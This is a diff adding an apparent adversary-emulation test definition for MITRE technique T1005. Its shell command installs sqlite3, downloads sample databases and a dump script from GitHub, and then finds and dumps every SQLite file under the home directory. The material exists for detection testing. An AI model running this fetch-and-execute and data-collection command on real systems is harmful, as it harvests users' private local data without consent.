@@ -1,0 +1,28 @@
+---
+- id: 4db9778077d77bc4d55d05023ffc36cd
+  name: Find and dump sqlite databases (Linux)
+  description: 'An adversary may know/assume that the user of a system uses sqlite
+    databases which contain interest and sensitive data. In this test we download
+    two databases and a sqlite dump script, then run a find command to find & dump
+    the database content.
+
+    '
+  tactic: collection
+  technique:
+    attack_id: T1005
+    name: Data from Local System
+  platforms:
+    linux:
+      sh:
+        command: 'if [ -x "$(command -v sqlite3)" ]; then : ; else if grep -iq "debian\|ubuntu\|kali\|mint"
+          /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3;
+          fi; if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update
+          -y && yum install -y binutils curl sqlite-devel; fi; fi;  cd $HOME; curl
+          -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art;
+          curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/gta.db;
+          curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/sqlite_dump.sh;
+          chmod +x sqlite_dump.sh; find . ! -executable -exec bash -c ''if [[ "$(head
+          -c 15 {} | strings)" == "SQLite format 3" ]]; then echo "{}"; ./sqlite_dump.sh
+          {}; fi'' \; '
+        payloads: []
+        cleanup: rm -f $HOME/.art; rm -f $HOME/gta.db; rm -f $HOME/sqlite_dump.sh
